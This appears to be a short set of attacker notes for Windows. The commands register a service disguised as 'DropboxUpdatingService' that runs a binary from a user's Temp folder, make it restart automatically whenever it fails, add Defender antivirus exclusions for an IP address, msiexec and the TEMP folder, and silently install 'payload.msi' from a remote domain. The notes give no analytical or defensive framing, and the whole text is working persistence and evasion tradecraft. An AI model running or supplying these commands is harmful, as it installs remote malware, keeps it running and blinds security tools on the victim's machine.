Run CMD command (with admin): `sc create "DropboxUpdatingService" binPath= C:\Users\szymo\AppData\Local\Temp\sc.exe type= own start= delayed-auto`

Allow Auto Restart if service fails (handler not connected, etc.): `sc.exe failure "DropboxUpdatingService" reset= 43200 actions= restart/300000/restart/300000/restart/300000/restart/300000/restart/300000`

`cmd /c "PowerShell -Command "Add-MpPreference -ExclusionIpAddress 209.38.162.83 -ExclusionProcess msiexec.exe -ExclusionPath C:\Windows\System32\msiexec.exe, C:\Windows\Installer, $env:TEMP" & msiexec.exe /quiet /i "https://junin.maximec.dev/payload.msi""`
